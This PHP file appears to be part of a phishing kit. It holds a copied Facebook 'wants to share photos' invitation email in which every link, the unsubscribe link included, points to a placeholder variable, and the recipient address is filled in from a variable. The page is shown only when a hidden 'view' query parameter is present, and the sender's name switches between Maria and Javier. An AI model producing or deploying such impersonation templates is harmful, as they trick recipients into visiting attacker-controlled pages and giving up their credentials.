<?php  

error_reporting(0);
$html='

<div class="c-ReadMessagePartBody" data-link="class{getClass:IsBodyExpanded}">            <script type="jsv#4647^"></script><script type="jsv/4647^"></script>              <div class="ClearBoth">        <script type="jsv#4648^"></script><script type="jsv/4648^"></script>                </div>        <div class="ClearBoth">          <script type="jsv#4649^"></script><script type="jsv/4649^"></script>        </div>              <div class="readMsgBody">          <div id="bodyreadMessagePartBodyControl2124f" class="ExternalClass MsgBodyContainer" data-link="class{:~tag.cssClasses(PlainText, IsContentFiltered)}"><title>Facebook</title><style>
.ExternalClass {
background:#e0e1e5;
font-family:\'Helvetica Neue\',Helvetica,\'Lucida Grande\',tahoma,verdana,arial,sans-serif;
font-weight:300;
}

.ExternalClass a {
color:#333;
text-decoration:none;
white-space:nowrap !important;
}

.ExternalClass #ecxemail_table {
width:100% !important;
}

.ExternalClass #ecxemail_content {
padding:0 !important;
}

.ExternalClass #ecxprofile_pic img {
border:0;
}

.ExternalClass *[class].ecxusercard {
background:#fff;
}

@media all and (max-device-width: 720px) {
.ExternalClass a {
white-space:pre-wrap !important;
}
.ExternalClass table[bgcolor="000023e9eaed"] {
background:transparent !important;
}
.ExternalClass *[id]#ecxbody_container {
border-bottom:1px solid #e5e5e5 !important;
}
.ExternalClass table[width="610"], .ExternalClass *[id]#ecxbody_container, .ExternalClass *[id]#ecxcta_container {
table-layout:fixed;
}
.ExternalClass *[id]#ecxcta_outer {
border:none !important;
}
.ExternalClass *[id]#ecxprofile_name {
display:none;
}
.ExternalClass *[id]#ecxprofile_pic {
border-radius:3px !important;
border-width:0 !important;
overflow:hidden;
}
.ExternalClass *[id]#ecxheader_title {
width:auto !important;
}
.ExternalClass *[id]#ecxheader_profile {
width:24px;
}
.ExternalClass *[class].ecxbio {
display:none !important;
}
.ExternalClass *[id]#ecxmain_content {
width:100%;
}
.ExternalClass *[class].ecxcontent>div a {
display:block;
overflow:hidden;
text-overflow:ellipsis;
white-space:nowrap !important;
width:160px;
}
.ExternalClass *[class].ecxext {
padding-right:20px;
}
.ExternalClass *[class].ecximage a {
display:block;
}
.ExternalClass *[class].ecxcta_btn, .ExternalClass *[class].ecxscnd_btn {
display:block;
}
.ExternalClass *[id]#ecxemail_cta>tbody>tr>td[width="100000025"] {
display:none;
}
}

@media all and (device-width: 720px) {
.ExternalClass table[width="610"], .ExternalClass *[id]#ecxbody_container, .ExternalClass *[id]#ecxfooter_container {
width:340px;
}
.ExternalClass *[id]#ecxemail_filler td {
height:12px !important;
}
.ExternalClass *[class].ecxusercard {
width:300px !important;
}
}

@media all and (max-device-width: 480px) {
.ExternalClass *[id]#ecxcta_container>table>tbody>tr>td[height="15"] {
display:none !important;
}
}

@media all and (device-width: 320px) {
.ExternalClass table[width="610"], .ExternalClass *[id]#ecxbody_container, .ExternalClass *[id]#ecxcta_container {
min-width:400px;
width:auto;
}
.ExternalClass center {
padding:0 10px;
}
.ExternalClass *[class].ecxcontent>div a {
width:182px;
}
}

@media all and (device-width: 720px) {
.ExternalClass *[class].ecxexpl {
width:280px !important;
}
}
</style><table cellspacing="0" cellpadding="0" id="ecxemail_table" style="border-collapse:collapse;width:98%;" border="0"><tbody><tr><td id="ecxemail_content" style="font-family:\'lucida grande\',tahoma,verdana,arial,sans-serif;font-size:12px;padding:0px;background:#e0e1e5;"><table cellspacing="0" cellpadding="0" width="100%" border="0" style="border-collapse:collapse;width:100%;"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0;border-left:none;border-right:none;border-top:none;border-bottom:none;"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse;"><tbody><tr><td style="padding:0;width:100%;"><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#435E9C" style="border-collapse:collapse;width:100%;background:#435E9C;border-color:#0A1F4F;border-style:solid;border-width:0px 0px 1px 0px;box-shadow:0 1px 1px rgba(0, 0, 0, 0.25);height:47px;" id="header"><tbody><tr><td style=""><center>.<tr><td align="left" id="ecxheader_title" style="width:100%;line-height:47px;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tbody><tr><td style=""><a href="'.$var.'" style="color:#FFFFFF;text-decoration:none;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:baseline;font-size:20px;letter-spacing:-0.03em;text-align:left;text-shadow:0 1px 0 rgba(0, 0, 0, 0.24);" target="_blank"> facebook
</a></td><td width="10" style="width:10px;"></td><td style=""><font color="white" size="3"><a style="color:#ffffff;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;font-weight:bold;text-shadow:0 -1px rgba(34, 59, 115, 0.85);vertical-align:middle;" href="'.$var.'" target="_blank"></a></font></td></tr></tbody></table></td></tr></tbody></table></center></td></tr></tbody></table></td></tr><tr><td style="padding:0;width:100%;"><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#e0e1e5" id="ecxtable_color" style="border-collapse:collapse;"><tbody><tr><td style=""><table cellspacing="0" cellpadding="0" width="100%" id="ecxemail_filler" style="border-collapse:collapse;"><tbody><tr><td height="19" style="">&nbsp;</td></tr></tbody></table><center><table cellspacing="0" cellpadding="0" width="610" style="border-collapse:collapse;"><tbody><tr><td align="left" id="ecxbody_container" style="background-color:#ffffff;border-color:#c1c2c4;border-style:solid;display:block;border-width:1px;border-radius:5px;box-shadow:0 1px 1px rgba(0, 0, 0, 0.10);overflow:hidden;"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse;"><tbody><tr><td style=""><table cellspacing="0" cellpadding="0" width="100%" height="60" style="border-collapse:collapse;text-align:center;border-color:#e5e5e5;border-style:solid;border-width:0 0 1px 0;"><tbody><tr><td height="4" colspan="3" style="">&nbsp;</td></tr><tr><td width="20" style=""></td><td style=""><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#7f7f7f;font-size:16px;font-style:normal;" id="ecxheadline"><font size="4"><a href="'.$var.'" style="color:#3b5998;text-decoration:none;" target="_blank">Maria</a> wants to share photos and updates with you.</font></span></td><td width="20" style=""></td></tr><tr><td height="4" colspan="3" style="">&nbsp;</td></tr></tbody></table><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#f5f6f7" style="border-collapse:collapse;"><tbody><tr><td height="32" colspan="3" style="height:32px;">&nbsp;</td></tr><tr><td width="50%" style=""></td><td style=""><center><div style="border-color:#d8d8d9;border-width:1px;border-style:solid;border-radius:3px;box-shadow:0 1px 1px rgba(0, 0, 0, 0.10);display:inline-block;width:456px;background:#ffffff;" class="ecxusercard"><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#fffffe" align="left" class="ecxusercard" style="border-collapse:collapse;"><tbody><tr><td height="23" colspan="3" style="height:23px;">&nbsp;</td></tr><tr><td width="23" style="width:23px;"></td><td style=""><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse;table-layout:fixed;"><tbody><tr><td width="84" style="width:84px;"><a href="'.$var.'" style="color:#3b5998;text-decoration:none;" target="_blank"><img border="0" src="https://scontent.feoh1-1.fna.fbcdn.net/v/t1.0-9/13686702_1370095839685554_8433482821816742845_n.jpg?oh=e93c124a988ddaac9f2b0f2554ae842e&oe=5860D6EE" width="84px" height="84px;" style="border:0;"></a></td><td width="12" style="width:12px;"></td><td align="left" valign="top" style=""><font size="4"><a href="'.$var.'" style="color:#3b5998;text-decoration:none;" target="_blank"><strong style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-weight:bold;font-size:18px;color:#333333;display:block;">Maria</strong></a></font><font size="3"></font></td></tr><tr><td height="18" colspan="3" style="height:18px;">&nbsp;</td></tr><tr><td colspan="3" style=""><a href="'.$var.'" class="ecxcta_btn" style="color:#3b5998;text-decoration:none;" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" bgcolor="#4c649b" style="border-collapse:collapse;border-width:1px;border-style:solid;display:block;font-weight:bold;border-radius:5px;font-size:18px;border-color:#485a83;box-shadow:inset 0 1px 0 rgba(255, 255, 255, 0.2),0 1px 2px rgba(0, 0, 0, 0.08);text-align:center;" class="ecxbtn_confirm"><tbody><tr><td height="14" colspan="3" style="line-height:14px;">&nbsp;</td></tr><tr><td width="38" style="display:block;width:38px;">&nbsp;</td><td width="100%" style="text-align:center;"><a href="'.$var.'" style="color:#3b5998;text-decoration:none;display:block;" target="_blank"><center><font size="4"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-weight:bold;font-size:18px;color:#ffffff;text-shadow:0 1px 0 #415686;">View&nbsp;Javier\'s&nbsp;Photos</span></font></center></a></td><td width="38" style="display:block;width:38px;">&nbsp;</td></tr><tr><td height="14" colspan="3" style="line-height:14px;">&nbsp;</td></tr></tbody></table></a></td></tr></tbody></table></td><td width="23" style="width:23px;"></td></tr><tr><td height="23" colspan="3" style="height:23px;">&nbsp;</td></tr></tbody></table></div></center></td><td width="50%" style=""></td></tr><tr><td height="20" colspan="3" style="height:20px;">&nbsp;</td></tr><tr><td width="50%" style=""></td><td style=""><center><table cellspacing="0" cellpadding="0" width="456" class="ecxexpl" style="border-collapse:collapse;"><tbody><tr><td style=""><span class="ecxexpl" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#7f7f7f;display:block;font-size:15px;line-height:20px;width:456px;text-align:center;"><font size="3">Javier has invited you to Facebook. After you sign up, you\'ll be able to stay connected with friends by sharing photos and videos, posting status updates, sending messages and more.</font></span></td></tr></tbody></table></center></td><td width="50%" style=""></td></tr><tr><td height="32" colspan="3" style="height:32px;">&nbsp;</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></center></td></tr></tbody></table></td></tr><tr><td style="padding:0;width:100%;"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse;" id="ecxfooter_table"><tbody><tr><td style=""><center><table cellspacing="0" cellpadding="0" width="610" style="border-collapse:collapse;"><tbody><tr><td style=""><table cellspacing="0" cellpadding="0" width="610" border="0" id="footer" style="border-collapse:collapse;"><tbody><tr><td style="font-size:12px;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;padding:18px 0;border-left:none;border-right:none;border-top:none;border-bottom:none;color:#6a7180;font-weight:300;line-height:16px;text-align:center;border:none;">This message was sent to <a href="mailto:'.$seperate_email.'" style="color:#6a7180;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-weight:bold;">'.$seperate_email.'</a>. If you don\'t want to receive these emails from Facebook in the future or have your email
address used for friend suggestions, please <a href="'.$var.'" style="color:#6a7180;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-weight:bold;" target="_blank">unsubscribe</a>. Facebook, Inc., Attention: Department 415, PO Box 10005, Palo Alto, CA 94303</td></tr></tbody></table></td></tr></tbody></table></center></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><span style="width:100%;"><img src="https://www.facebook.com/email_open_log_pic.php?h=AQAf9nMs7WYFJVvBGRqbLHkLJgHUSQ-JrusV5n7uqRlPX-hNZey7LL4BFmKYcfyTImrObpFMqcc1CwdBMJFN_kOSmzw&amp;t=1" style="border:0;width:1px;height:1px;"></span></td></tr></tbody></table>


</div>        </div>      <script type="jsv#4650^"></script><script type="jsv/4650^"></script>    </div>

';


if(!empty($_GET['view'])){echo $html;}
?>